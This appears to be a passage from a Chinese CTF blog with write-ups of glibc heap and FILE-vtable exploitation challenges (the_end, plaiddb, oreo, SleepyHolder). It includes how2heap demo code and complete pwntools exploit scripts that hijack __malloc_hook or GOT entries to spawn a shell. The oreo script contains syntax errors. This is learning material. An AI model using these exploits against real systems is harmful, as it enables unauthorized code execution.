it&#x27;s too small. */#define __HAVE_COLUMN /* temporary */ /* 1+column number of pbase(); 0 is unknown. */ unsigned short _cur_column; signed char _vtable_offset; char _shortbuf[1]; /* char* _save_gptr; char* _save_egptr; */ _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE&#125;;/* We always allocate an extra word following an _IO_FILE. This contains a pointer to the function jump table used. This is for compatibility with C++ streambuf; the word can be used to smash to a pointer to a virtual function table. */ ​ _IO_FILE中有一个指针成员为chain，可以将进程中所有的_IO_FILE结构串起来，构成链表，链表头部存储在全局变量_IO_list_all中。再清理io流的时候会遍历此链表。 ​ 进程一开始，本来啥io流都没有，但是没有io就不能实现交互，所以所有进程都存在三个自动打开的io流：stdin，stdout，stderr。分别控制程序的输入，输出和报错。这三个io流都是_IO_FILE结构，在符号表中是这样存储的: 123_IO_2_1_stderr__IO_2_1_stdout__IO_2_1_stdin_ ​ _IO_FILE_plus在_IO_FILE的基础上，加上一个指向_IO_jump_t 结构体，叫vtable的指针，又封装成了一个结构体： 12345struct _IO_FILE_plus&#123; _IO_FILE file; const struct _IO_jump_t *vtable;&#125;; ​ 而这个vtable(虚表)指向的结构体，是一张函数表，存了许多与io操作相关的函数。io操作会通过交叉引用间接访问到函数表中的相关函数。这张函数表长这样： 1234567891011121314151617181920212223const struct _IO_jump_t _IO_file_jumps =&#123; **JUMP_INIT_DUMMY, JUMP_INIT(finish, _IO_file_finish), JUMP_INIT(overflow, _IO_file_overflow), JUMP_INIT(underflow, _IO_file_underflow), JUMP_INIT(uflow, _IO_default_uflow), JUMP_INIT(pbackfail, _IO_default_pbackfail), JUMP_INIT(xsputn, _IO_file_xsputn), JUMP_INIT(xsgetn, _IO_file_xsgetn), JUMP_INIT(seekoff, _IO_new_file_seekoff), JUMP_INIT(seekpos, _IO_default_seekpos), JUMP_INIT(setbuf, _IO_new_file_setbuf), JUMP_INIT(sync, _IO_new_file_sync), JUMP_INIT(doallocate, _IO_file_doallocate), JUMP_INIT(read, _IO_file_read), JUMP_INIT(write, _IO_new_file_write), JUMP_INIT(seek, _IO_file_seek), JUMP_INIT(close, _IO_file_close), JUMP_INIT(stat, _IO_file_stat), JUMP_INIT(showmanyc, _IO_default_showmanyc), JUMP_INIT(imbue, _IO_default_imbue)&#125;; 0x01 . Vtable 劫持​ vtable，或者叫虚表。IO的相关操作中，某些函数会调用到虚表中的值。比如exit()会在一系列的交叉引用中调用到其虚表中的setbuf()，printf()会用到xput()等等。详细的调用只能查查看相关函数的源代码了。。。以后再详述。（🕊🕊🕊） ​ 虚表说起来跟got表plt表差不多(个人理解)，都可以通过劫持表来控制程序流程。但不同的是，got表可写，虚表不能直接改写，这也就限制了我们不能直接修改虚表使其指向目标函数。但是我们可以通过伪造虚表达到同样效果。大致思路如下： 要找到虚表，得先找到它所在的结构体，即_IO_FILE_plus位于哪里。这里我们需要知道：如果文件流是以fopen()的方式打开的，那么文件流会存在堆上；而如果是stdin，stdout，stderr则是存在库文件中。本文章仅考虑后者的情况。 首先我们要确定库文件的版本，根据不同版本确定vtable相对于_IO_FILE_plus开始地址的偏移量。在libc2.23 版本下，32 位的 vtable 偏移为 0x94，64 位偏移为 0xd8。 根据偏移我们就能求出虚表的地址，就能伪造虚表劫持程序流程了。libc2.23版本下虚表的伪造不存在安全检测，更高的libc版本里则需要讨论保护绕过了。 之后还需要找到函数调用过虚表中的哪个函数(victim_function)，通过固定偏移和程序中的其他漏洞，进行任意写，将victim_function换成one_gadget地址，就能getshell。 0x02 . the_end1 . Analysis​ 例行公事如下： ​ main函数如下，除此之外没有其他乱七八糟的函数了。。 ​ 在for循环里面可以看到，程序允许用户进行五次输入操作的循环，每次循环中，将用户的第一次输入作为一个地址（可写入8个字节，对于64位程序来说恰好为一个地址），用户的第二次输入就将写在这个地址中（可写入1个字节）。 ​ 也就是说，我们可以实现任意地址写，不过只能写5个字节。 ​ 主函数中，for循环的任意写结束后就是exit函数了，而且题目“the_end”也很明显地提示了漏洞应该在结尾处，所以聪明机智的我考虑捯饬捯饬exit函数。 2 . Attack​ 去了解之后知道了exit()函数作用是结束子进程，返回给父进程，那当然需要清理IO流咯。又了解到它清理IO流时，系统会遍历IO_list_all，调用IO_2_1_stdout_，再调用vtable 中 _setbuf 函数。 ​ 用ida打开libc-2.23.so，先找出IO_2_1_stdout_符号，之后看结构可以确定，0x3C56F8处的就是虚表。 ​ 根据虚表在64位程序中的偏移，可以求出虚表的地址。 ​ 查一下上面的虚函数表，可以计算出setbuf相对于vtable的偏移量为11 * 0x8 = 0x58（64位）。根据setbuf的偏移，可以求出setbuf的地址。 ​ 所以我们要做的就是：伪造一个虚表，将fake_vtabel+0x58的地方改成one_gadget的地址，再将虚表指向伪造的虚表。然后函数调用到setbuf的时候就会定位到伪造虚表中的one_gadget地址。 ​ 因为我们只能写入5个字节，所以fake_vtable+0x58与one_gadget，虚表和伪造虚表的偏移都不能太大。所以考虑将虚表定位在虚表的附近，用两个字节来覆写，然后再用剩下三个字节将one_gadget写入到fake_vtable+0x58。 ​ 最后getshell时需要注意，程序中的： 12close(1);close(2); ​ 两行代码将输出流错误流关掉了，所以最后我们getshell的时候没有回显，具体对策是最后getshell后，进行io重定向，将输出流重定向到输入流，即使用如下命令： 1cat flag.txt 1&gt;&amp;0 3.Exploit（from CTF-Wiki😓）​ 由于莫名其妙的原因，我在ubuntu中运行程序的时候，只能进行7次输入，然后就直接退出了。。。。也不知道自己写的exp对不对，还是贴一下CTF-Wiki的吧。 12345678910111213141516171819202122232425262728293031323334353637383940from pwn import *context.log_level=&quot;debug&quot;libc=ELF(&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;)# p = process(&#x27;the_end&#x27;)p = remote(&#x27;127.0.0.1&#x27;,1234)rem = 0if rem ==1: p = remote(&#x27;150.109.44.250&#x27;,20002) p.recvuntil(&#x27;Input your token:&#x27;) p.sendline(&#x27;RyyWrOLHepeGXDy6g9gJ5PnXsBfxQ5uU&#x27;)sleep_ad = p.recvuntil(&#x27;, good luck&#x27;,drop=True).split(&#x27; &#x27;)[-1]libc_base = long(sleep_ad,16) - libc.symbols[&#x27;sleep&#x27;]one_gadget = libc_base + 0xf02b0vtables = libc_base + 0x3C56F8fake_vtable = libc_base + 0x3c5588target_addr = libc_base + 0x3c55e0print &#x27;libc_base: &#x27;,hex(libc_base)print &#x27;one_gadget:&#x27;,hex(one_gadget)print &#x27;exit_addr:&#x27;,hex(libc_base + libc.symbols[&#x27;exit&#x27;])# gdb.attach(p)for i in range(2): p.send(p64(vtables+i)) p.send(p64(fake_vtable)[i])for i in range(3): p.send(p64(target_addr+i)) p.send(p64(one_gadget)[i])p.sendline(&quot;exec /bin/sh 1&gt;&amp;0&quot;)p.interactive() ​ ​","categories":[],"tags":[{"name":"heap","slug":"heap","permalink":"http://example.com/tags/heap/"}]},{"title":"Off_By_One (plaiddb)","slug":"Off_By_One","date":"2020-03-16T08:09:47.000Z","updated":"2021-03-24T09:47:50.628Z","comments":true,"path":"2020/03/16/Off_By_One/","link":"","permalink":"http://example.com/2020/03/16/Off_By_One/","excerpt":"​ plaiddb快把我肝崩溃了。。","text":"​ plaiddb快把我肝崩溃了。。 0x00 . Off_By_One​ 这个知识点在how2heap里是叫poison_null_byte，结果我上ctf-wiki找writeup的时候没找着，原来人家也叫off_by_one。下面先分析代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;malloc.h&gt;int main()&#123; fprintf(stderr, &quot;Welcome to poison null byte 2.0!\\n&quot;); fprintf(stderr, &quot;Tested in Ubuntu 14.04 64bit.\\n&quot;); fprintf(stderr, &quot;This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\\n&quot;); fprintf(stderr, &quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.\\n&quot;); uint8_t* a; uint8_t* b; uint8_t* c; uint8_t* b1; uint8_t* b2; uint8_t* d; void *barrier; fprintf(stderr, &quot;We allocate 0x100 bytes for &#x27;a&#x27;.\\n&quot;); a = (uint8_t*) malloc(0x100); fprintf(stderr, &quot;a: %p\\n&quot;, a); int real_a_size = malloc_usable_size(a); fprintf(stderr, &quot;Since we want to overflow &#x27;a&#x27;, we need to know the &#x27;real&#x27; size of &#x27;a&#x27; &quot; &quot;(it may be more than 0x100 because of rounding): %#x\\n&quot;, real_a_size); /* chunk size attribute cannot have a least significant byte with a value of 0x00. * the least significant byte of this will be 0x10, because the size of the chunk includes * the amount requested plus some amount required for the metadata. */ b = (uint8_t*) malloc(0x200); fprintf(stderr, &quot;b: %p\\n&quot;, b); c = (uint8_t*) malloc(0x100); fprintf(stderr, &quot;c: %p\\n&quot;, c); barrier = malloc(0x100); fprintf(stderr, &quot;We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\\n&quot; &quot;The barrier is not strictly necessary, but makes things less confusing\\n&quot;, barrier); uint64_t* b_size_ptr = (uint64_t*)(b - 8); // added fix for size==prev_size(next_chunk) check in newer versions of glibc // https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30 // this added check requires we are allowed to have null pointers in b (not just a c string) //*(size_t*)(b+0x1f0) = 0x200; fprintf(stderr, &quot;In newer versions of glibc we will need to have our updated size inside b itself to pass &quot; &quot;the check &#x27;chunksize(P) != prev_size (next_chunk(P))&#x27;\\n&quot;); // we set this location to 0x200 since 0x200 == (0x211 &amp; 0xff00) // which is the value of b.size after its first byte has been overwritten with a NULL byte *(size_t*)(b+0x1f0) = 0x200; // this technique works by overwriting the size metadata of a free chunk free(b); fprintf(stderr, &quot;b.size: %#lx\\n&quot;, *b_size_ptr); fprintf(stderr, &quot;b.size is: (0x200 + 0x10) | prev_in_use\\n&quot;); fprintf(stderr, &quot;We overflow &#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;\\n&quot;); a[real_a_size] = 0; // &lt;--- THIS IS THE &quot;EXPLOITED BUG&quot; fprintf(stderr, &quot;b.size: %#lx\\n&quot;, *b_size_ptr); uint64_t* c_prev_size_ptr = ((uint64_t*)c)-2; fprintf(stderr, &quot;c.prev_size is %#lx\\n&quot;,*c_prev_size_ptr); // This malloc will result in a call to unlink on the chunk where b was. // The added check (commit id: 17f487b), if not properly handled as we did before, // will detect the heap corruption now. // The check is this: chunksize(P) != prev_size (next_chunk(P)) where // P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow) // next_chunk(P) == b-0x10+0x200 == b+0x1f0 // prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200 fprintf(stderr, &quot;We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\\n&quot;, *((size_t*)(b-0x8)), *(size_t*)(b-0x10 + *((size_t*)(b-0x8)))); b1 = malloc(0x100); fprintf(stderr, &quot;b1: %p\\n&quot;,b1); fprintf(stderr, &quot;Now we malloc &#x27;b1&#x27;. It will be placed where &#x27;b&#x27; was. &quot; &quot;At this point c.prev_size should have been updated, but it was not: %#lx\\n&quot;,*c_prev_size_ptr); fprintf(stderr, &quot;Interestingly, the updated value of c.prev_size has been written 0x10 bytes &quot; &quot;before c.prev_size: %lx\\n&quot;,*(((uint64_t*)c)-4)); fprintf(stderr, &quot;We malloc &#x27;b2&#x27;, our &#x27;victim&#x27; chunk.\\n&quot;); // Typically b2 (the victim) will be a structure with valuable pointers that we want to control b2 = malloc(0x80); fprintf(stderr, &quot;b2: %p\\n&quot;,b2); memset(b2,&#x27;B&#x27;,0x80); fprintf(stderr, &quot;Current b2 content:\\n%s\\n&quot;,b2); fprintf(stderr, &quot;Now we free &#x27;b1&#x27; and &#x27;c&#x27;: this will consolidate the chunks &#x27;b1&#x27; and &#x27;c&#x27; (forgetting about &#x27;b2&#x27;).\\n&quot;); free(b1); free(c); fprintf(stderr, &quot;Finally, we allocate &#x27;d&#x27;, overlapping &#x27;b2&#x27;.\\n&quot;); d = malloc(0x300); fprintf(stderr, &quot;d: %p\\n&quot;,d); fprintf(stderr, &quot;Now &#x27;d&#x27; and &#x27;b2&#x27; overlap.\\n&quot;); memset(d,&#x27;D&#x27;,0x300); fprintf(stderr, &quot;New b2 content:\\n%s\\n&quot;,b2); fprintf(stderr, &quot;Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks&quot; &quot;for the clear explanation of this technique.\\n&quot;);&#125; ​ 代码一开始还没看懂来着，看着它把b一分为二一头雾水不知道干啥，后来看了下刘老板的blog才理解的。 ​ 其大致的意思就是：系统的边界检查不严谨，当chunk填充大小为malloc_size时，整个chunk被字符串填满，而字符串还需要有’\\x00’字符结尾，也就将下一个chunk的size的第一个字节修改了，有可能只改了in_use位(0x101 –&gt; 0x100)，有可能size和in_use位都改了(0x111 –&gt; 0x100)，这要看具体的chunk_size和利用过程。 ​ 参考如下示意图（没想到画个图要那么久。。）： ​ 1.a = malloc(0x100) b = malloc(0x200) c = malloc(0x100) barrier = malloc(0x100)最后这个chunk是用来隔开top chunk，否则当c释放时，top chunk会将其合并。 ​ 2.接着用a的溢出将b_size修改成0x200，并同时在b+0x200的地方写入0x200用作fake_pre_size用来通过检查。然后释放b。系统就会将b到b+0x200的空间释放，而非释放整个b chunk。 ​ 3.现在b的可控大小为0x200，存于unsort bin，现在将其进行分割。b1 = malloc(0x100)，b2 = malloc(0x80)。b1用来进行unlink合并，b2用来overlap。 ​ 4.释放b1，释放c，系统会根据c的pre_size找到b1的size，发现in_use == 0，于是将其合并。如此一来，b1到c都变成了一个chunk被收到unsort bin中。 ​ 5.d = malloc(0x400)，可以使得d的一部分与b2发生overlap。 ​ 6.overlap之后可以进行很多攻击。例如先free(d)，再malloc出d到b2中间的部分，此时b2到barrier的剩余空间仍作为一个孤零零的chunk呆在unsort bin，所以其fd，bk都指向main arena，再用可控的chunk b2就可以leak。 0x01 . plaiddb​ 天知道我查了多少个writeup，能基本看懂的也只有ctf-wiki的。。。。（CTF-Wiki🐂🍺！！） A . Analysis​ 64位，文件保护全开。。 ​ 主要的数据结构如下（参考参考CTF-Wiki，我只分析出前三个。。）： 123456789struct Node &#123; char *key; long data_size; char *data; struct Node *left; struct Node *right; long what_1; long what_2; &#125; ​ 怪不得一大片乱糟糟的指针操作，原来是树结构。那还分析个🔨。 ​ 不过看了看writeup好像这题利用跟树结构没啥关系。 ​ 主要函数有：GET(show_single)，PUT(add)，DUMP(show_all)，DEL(delete)，read_in。 ​ 漏洞在read_in函数里，可以溢出一个空字节。而且此处用到的是realloc()函数，申请的内存大小是可用大小逐次乘2所得的结果，所以说需要特定大小的chunk才能进行溢出。(0x18,0x38,0x78,0xf8,0x1f8) 123456789101112131415161718192021222324252627282930313233343536373839char *sub_1040()&#123; char *v0; // r12 char *v1; // rbx size_t v2; // r14 char v3; // al char v4; // bp signed __int64 v5; // r13 char *v6; // rax v0 = malloc(8uLL); v1 = v0; v2 = malloc_usable_size(v0); while ( 1 ) &#123; v3 = _IO_getc(stdin); v4 = v3; if ( v3 == -1 ) sub_1020(); if ( v3 == 10 ) break; v5 = v1 - v0; if ( v2 &lt;= v1 - v0 ) &#123; v6 = realloc(v0, 2 * v2); //realloc require a special size of chunk v0 = v6; if ( !v6 ) &#123; puts(&quot;FATAL: Out of memory&quot;); exit(-1); &#125; v1 = &amp;v6[v5]; v2 = malloc_usable_size(v6); &#125; *v1++ = v4; &#125; *v1 = 0; //off by one return v0;&#125; ​ 先来跑一遍程序看看： ​ 根据以下heap结构以及ida的静态分析可以看出，每执行一次PUT，系统会分配三个连续的chunk。a.row 结构体(0x40) b.row key(0x20) c.row data(size)。结构体中存有指向key和data的指针。 B. Memory Arrangement​ 1.malloc出需要的chunk 123456a = malloc(0x200); //unsort chunk,b = malloc(0x50); //overlap chunk，leak libc_basec = malloc(0x68); //修改其fd，用于fast attackd = malloc(0x1f8); //溢出chunk，修改下一chunk的pre_size和in_use字节（用到了off_by_one漏洞）e = malloc(0xf0); //victim chunk，被溢出chunkbarrier = malloc(0x400) //确保以上chunk不被top chunk合并。 ​ 2.把a，c，d三个chunk释放。 ​ 3.因为DEL函数也用到了read_in 函数，也可以进行溢出，所以这里DEL(payload)，payload大小为0x1f8，而chunk_d实际可写大小只有0x1f0，因此可以在payload的最后写入fake_pre_size，同时覆写了chunk_e的pre_size和in_use字节。 ​ 4.现在释放chunk_e，系统将寻址至chunk_e - pre_size == chunk_e - 0x4e0 == chunk_a,系统将chunk_a unlink，然后合并a到e的所有内存，并入一个unsort chunk。 ​ 5.而chunk_b还在使用，造成了overlap。 ​ 6.接下来malloc(0x200)两次，第一次是把原来释放的chunk_a分配出来，第二次是在后来被系统合并的大chunk中割下0x210的空间，然后这个大chunk的地址将和chunk_b重合。由于只有大chunk一个unsort chunk在bin中，因此其fd，bk指向main_arena，于是可以溢出了。 C. Leak Libc_base &amp; get shell​ 1.GET(chunk_b)并通过计算可以得到libc_base，同时也可以算出malloc_hook的地址。 ​ 2.用one_gadget得到libc中excute(“/bin/sh”);的地址 ​ 3.malloc(0x100)，可以得到chunk_b到chunk_b + 0x100的内存，用来填充chunk_b，并用malloc_hook的上方地址覆写chunk_c的fd。 ​ 4.malloc两次，以malloc_hook上方地址为首地址的chunk，写入one_gadget到malloc_hook，完事儿。。 D . Exploit​ 脚本还是得参考CTF-Wiki，自己真是肝不出来。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109#! /usr/bin/env python2# -*- coding: utf-8 -*-# vim:fenc=utf-8import sysimport osimport os.pathfrom pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)if len(sys.argv) &gt; 2: DEBUG = 0 HOST = sys.argv[1] PORT = int(sys.argv[2]) p = remote(HOST, PORT)else: DEBUG = 1 if len(sys.argv) == 2: PATH = sys.argv[1] p = process(PATH)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;) # ubuntu 16.04def cmd(command_num): p.recvuntil(&#x27;command:&#x27;) p.sendline(str(command_num))def put(key, size, data): cmd(&#x27;PUT&#x27;) p.recvuntil(&#x27;key:&#x27;) p.sendline(key) p.recvuntil(&#x27;size:&#x27;) p.sendline(str(size)) p.recvuntil(&#x27;data:&#x27;) if len(data) &lt; size: p.send(data.ljust(size, &#x27;\\x00&#x27;)) else: p.send(data)def delete(key): cmd(&#x27;DEL&#x27;) p.recvuntil(&#x27;key:&#x27;) p.sendline(key)def get(key): cmd(&#x27;GET&#x27;) p.recvuntil(&#x27;key:&#x27;) p.sendline(key) p.recvuntil(&#x27;[&#x27;) num = int(p.recvuntil(&#x27; bytes&#x27;).strip(&#x27; bytes&#x27;)) p.recvuntil(&#x27;:\\n&#x27;) return p.recv(num)def main(): # avoid complicity of structure malloc for i in range(10): put(str(i), 0x38, str(i)) for i in range(10): delete(str(i)) # allocate what we want in order put(&#x27;1&#x27;, 0x200, &#x27;1&#x27;) put(&#x27;2&#x27;, 0x50, &#x27;2&#x27;) put(&#x27;5&#x27;, 0x68, &#x27;6&#x27;) put(&#x27;3&#x27;, 0x1f8, &#x27;3&#x27;) put(&#x27;4&#x27;, 0xf0, &#x27;4&#x27;) put(&#x27;defense&#x27;, 0x400, &#x27;defense-data&#x27;) # free those need to be freed delete(&#x27;5&#x27;) delete(&#x27;3&#x27;) delete(&#x27;1&#x27;) delete(&#x27;a&#x27; * 0x1f0 + p64(0x4e0)) delete(&#x27;4&#x27;) put(&#x27;0x200&#x27;, 0x200, &#x27;fillup&#x27;) put(&#x27;0x200 fillup&#x27;, 0x200, &#x27;fillup again&#x27;) libc_leak = u64(get(&#x27;2&#x27;)[:6].ljust(8, &#x27;\\x00&#x27;)) p.info(&#x27;libc leak: 0x%x&#x27; % libc_leak) libc_base = libc_leak - 0x3c4b78 p.info(&#x27;libc_base: 0x%x&#x27; % libc_base) put(&#x27;fastatk&#x27;, 0x100, &#x27;a&#x27; * 0x58 + p64(0x71) + p64(libc_base + libc.symbols[&#x27;__malloc_hook&#x27;] - 0x10 + 5 - 8)) put(&#x27;prepare&#x27;, 0x68, &#x27;prepare data&#x27;) one_gadget = libc_base + 0x4526a put(&#x27;attack&#x27;, 0x68, &#x27;a&#x27; * 3 + p64(one_gadget)) p.sendline(&#x27;DEL&#x27;) # malloc(8) triggers one_gadget p.interactive()if __name__ == &#x27;__main__&#x27;: main() ​ ps.不过有一个地方一直没弄明白：前面说的每一次PUT都会mallc()3次，而且理应是连续地址的三个chunk，但是CTF-Wiki的解法，以及各种其他师傅的解法都只考虑了data chunk，我和刘老板倒是考虑了三个chunk连续的情况，但是我没整出来。暂时先按照writeup的来吧。。之后再回头看看。","categories":[],"tags":[{"name":"heap","slug":"heap","permalink":"http://example.com/tags/heap/"}]},{"title":"House_of_spirit","slug":"house-of-spirit","date":"2020-03-06T10:43:46.000Z","updated":"2021-03-24T09:46:32.419Z","comments":true,"path":"2020/03/06/house-of-spirit/","link":"","permalink":"http://example.com/2020/03/06/house-of-spirit/","excerpt":"​ Fastbin Attack 中的 house_of_spirit。 (精神家园？？)","text":"​ Fastbin Attack 中的 house_of_spirit。 (精神家园？？) 0x00 . house_of_spirit​ 按照惯例。。。看看how2heap的代码： 12345678910111213141516171819202122232425262728#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123; fprintf(stderr, &quot;This file demonstrates the house of spirit attack.\\n&quot;); fprintf(stderr, &quot;Calling malloc() once so that it sets up its memory.\\n&quot;); malloc(1); fprintf(stderr, &quot;We will now overwrite a pointer to point to a fake &#x27;fastbin&#x27; region.\\n&quot;); unsigned long long *a; // This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY) unsigned long long fake_chunks[10] __attribute__ ((aligned (16))); fprintf(stderr, &quot;This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\\n&quot;, sizeof(fake_chunks), &amp;fake_chunks[1], &amp;fake_chunks[9]); fprintf(stderr, &quot;This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\\n&quot;); fprintf(stderr, &quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \\n&quot;); fake_chunks[1] = 0x40; // this is the size fprintf(stderr, &quot;The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\\n&quot;); // fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8 fake_chunks[9] = 0x1234; // nextsize fprintf(stderr, &quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\\n&quot;, &amp;fake_chunks[1]); fprintf(stderr, &quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\\n&quot;); a = &amp;fake_chunks[2]; fprintf(stderr, &quot;Freeing the overwritten pointer.\\n&quot;); free(a); fprintf(stderr, &quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\\n&quot;, &amp;fake_chunks[1], &amp;fake_chunks[2]); fprintf(stderr, &quot;malloc(0x30): %p\\n&quot;, malloc(0x30));&#125; ​ 说实话，这个代码看得脑壳疼，没完全看懂。 ​ 大概的攻击思路就是，找一个可控的区域，比如栈，bss段，可读可写的，在此区域写一个fake fast chunk，然后想办法free掉，这么一来就掉进了fastbin里面。因为fake fast chunk在链表头(main_arena指向)，所以malloc后fake chunk会直接分配出来，然后就可以任意读写随意浪了。 0x01 . oreo 🍪A . ELF Analysis​ 明明是个买枪的程序。。。为啥叫奥利奥 ​ 花里胡哨的最喜欢了😬😬😬 ​ 主要函数如下 ​ add函数里可以发现，程序添加chunk时，会形成这样的一种链表结构： ​ 并且存在明显的溢出，所以可以估摸着覆盖掉next指针。 ​ show()：展示所有订单的description和name。 ​ order()：下单，并删除前面所有chunk。 ​ leave()：在订单中备注，用到了message指针(bss段)，而message指针在程序开头就指向了message_ptr。 ​ stats()：输出订单数和备注数以及最近一次备注内容，可以用作输出。 ​ 程序中用到的许多重要指针都能在bss段找到： B . Main ideas 💡 堆溢出构造链表，Leak libc_base。 伪造fake chunk，并且绕过检测 Getshell C . Step by Step1.Leak libc_base 新建一个chunk，通过溢出使得其next指针指向puts@got show()查看所有chunk的内容，得到puts_addr 通过计算得到libc_base，system@got。 2.Arrange fake chunk 循环新建chunk，当count_in_add == 0x3f，退出循环。 此时再新建一个chunk构造fake chunk。此时count_in_add == 0x40，我们可以将其用作fake chunk size fake chunk结构如下： 把fake chunk的next chunk的pre_size也给改了，就能绕过测试了。 万事俱备，用order()来free掉整个链表，然后main_arena就指向了最后的fake chunk。 3.Getshell 现在我们add()就能得到fake chunk，再在里面写入fgets@got，也就是写入到了fake chunk的fd位置。fgets@got在菜单循环的switch的参数函数中会用到。而红色箭头位置就是我们要写入“/bin/sh”的地儿。 这时再用leave()函数，修改message。注意此时message与fake chunk的fd是同一地址，上面的fake chunk结构图比较清楚。将message中内容(fgets@got)改成system@got。 现在直接送入”/bin/sh\\x00”就行啦。 D . Exploit1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859from pwn import *p = process(&#x27;./oreo&#x27;)elf = ELF(&#x27;./oreo&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)def add(des,name): p.sendlineafter(&quot;Action: &quot;,str(1)) p.sendlineafter(&quot;Rifle name: &quot;,name) p.sendlineafter(&quot;Rifle description: &quot;,des)def show(): p.sendlineafter(&quot;Action: &quot;,str(2)) p.recvuntil(&quot;===================================&quot;)def order(): p.sendlineafter(&quot;Action: &quot;,str(3)) p.recvuntill(&quot;Okay order submitted!&quot;)def leave(message): p.sendlineafter(&quot;Action: &quot;,str(4)) p.sendlineafter(&quot;your order:&quot;,message)def stats(): p.sendlineafter(&quot;Action: &quot;,str(5))puts_got = elf.gots[puts]free_got = elf.gots[free]puts_offset = libc.symbols[puts]system_offset = libc.symbols[system]#========================Leak libc base============================payload = 27 * &#x27;X&#x27; + p32(puts_got) #so the next chunk we could recv puts_gotadd(&quot;Nothing&quot;,payload)show()p.recvuntil(&quot;===================================&quot;)p.recvuntil(&quot;Description: &quot;)puts_plt = u32(p.recvuntil(&#x27;\\n&#x27;, drop=True)[:4]) #got the ture addr of putslibc_base = puts_plt - puts_offsetsystem_addr = libc_base + system_offset#========================Arrange fake chunk==========================num = 1while num&lt;3f : #System will break the circle while num (count_in_add) == 3f add(str(num),&quot;gun&quot;+str(num)) num++payload = 27 * &#x27;X&#x27; + p32(0x0804A2A8) #But 0x0804A2A8(massage) is now saving the message_ptradd(&quot;Nothing&quot;,payload) #count_in_add == 0x40,so it can be used as the size of fake_chunkpayload = 0x20 * &#x27;X&#x27; + p32(0x40)leave(payload) #now the fake_chunk is in the link_list and able to bypass the testorder() #delete the linklist,so the fake_chunk is in the fastbin now#============================Getshell=============================fgets_got = elf.got[fgets]add(fgets_got,&quot;Nothing&quot;) #the fake_chunk was malloced since it is in the bin_topleave(system_addr) #fgets_got was changed to system_addrp.sendline(&quot;/bin/sh\\x00&quot;) #fgets(&quot;/bin/sh&quot;) &lt;====&gt; system(&quot;/bin/sh&quot;)p.interactive()","categories":[],"tags":[{"name":"heap","slug":"heap","permalink":"http://example.com/tags/heap/"}]},{"title":"SleepHolder","slug":"SleepHolder","date":"2020-03-03T05:43:46.000Z","updated":"2021-03-24T09:47:13.425Z","comments":true,"path":"2020/03/03/SleepHolder/","link":"","permalink":"http://example.com/2020/03/03/SleepHolder/","excerpt":"​ 关于fastbin_dup_consolidate，以及unlink的另一题。","text":"​ 关于fastbin_dup_consolidate，以及unlink的另一题。 ​ 今天做题还挺快，毕竟是之前已经研究过一点的题目。 0x00 . fastbin_dup_consolidate​ 贴一下代码作为例子。。(code from how2heap) 1234567891011121314151617181920#include&lt;stdio.h&gt;#include&lt;stdint.h&gt;#include&lt;stdlib.h&gt;int main() &#123; void p1 = malloc(0x40); void p2 = malloc(0x40); fprintf(stderr, Allocated two fastbins p1=%p p2=%pn, p1, p2); fprintf(stderr, Now free p1!n); free(p1); void p3 = malloc(0x400); fprintf(stderr, Allocated large bin to trigger malloc_consolidate() p3=%pn, p3); fprintf(stderr, In malloc_consolidate(), p1 is moved to the unsorted bin.n); free(p1); fprintf(stderr, Trigger the double free vulnerability!n); fprintf(stderr, We can pass the check in malloc() since p1 is not fast top.n); fprintf(stderr, Now p1 is in unsorted bin and fast bin. So we&#x27;will get it twice %p %pn, malloc(0x40), malloc(0x40));&#125; ​ 代码说明了两件事： ​ 1、要实现double并非只能用释放堆块来掩护：free(1);free(2);free(1);还可以申请堆块来掩护：free(1);malloc(2);free(1); ​ 2、系统在分配large chunk的时候会调用malloc_consolidate()，这个函数相当于free()，就是一个回收函数，主要功能是将fastbin中的chunk整理一下，能合并就合并，不能合并也清除一下使用标志位(inuse = 0)，然后全部丢到unsort bin里面。 ​ 3、所以如果再malloc()一次，就可以多free(1)一次，因为人家本来也不在fast bin，而且也不被top chunk所指。 0x01 . SleepyHolder Write UpA . 分析程序​ 运行看看效果： 1234567891011121314151617181920212223242526272829303132Waking Sleepy Holder up ...Hey! Do you have any secret?I can help you to 